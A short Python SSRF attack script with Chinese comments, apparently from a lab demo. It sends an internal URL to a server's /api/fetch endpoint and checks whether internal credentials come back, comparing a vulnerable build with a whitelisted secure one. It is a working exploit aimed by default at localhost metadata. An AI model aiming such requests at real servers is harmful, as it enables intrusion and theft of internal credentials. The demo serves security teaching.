"""SSRF 攻擊腳本:把「抓取端點」誘導去打內部服務,竊取內部機密。

同一支腳本打 vulnerable 與 secure 兩版,靠回應裡有沒有內部機密證明漏洞是否成立:
- vulnerable:不驗證目標 → 伺服器代打內部服務 → 內部憑證被回傳給攻擊者。
- secure:白名單擋下內部主機 → 403 → 攻擊失敗。
"""

import requests

from ssrf_common import SECRET_MARKER

REQUEST_TIMEOUT_SECONDS = 5


def run_ssrf_attack(base_url, internal_url):
    """回傳 (是否竊取成功, 說明字串)。是否竊取成功=True 代表漏洞成立。

    internal_url:攻擊者猜到 / 探測到的內部服務位址(攻擊者無法直接存取,
    只能塞給有漏洞的抓取端點,借伺服器之手去打)。
    """
    resp = requests.post(
        f"{base_url}/api/fetch",
        json={"url": internal_url},
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if resp.status_code == 200 and SECRET_MARKER in resp.text:
        return True, f"SSRF 成功!借伺服器讀到內部服務 {internal_url} 的憑證({SECRET_MARKER})"
    if resp.status_code == 403:
        return False, f"被 403 擋下,白名單拒絕抓取內部主機({internal_url})"
    return False, f"未竊取到機密(status={resp.status_code})"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5071"
    internal = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:5070/metadata"
    stolen, message = run_ssrf_attack(target, internal)
    print(("[漏洞成立] " if stolen else "[已防禦] ") + message)
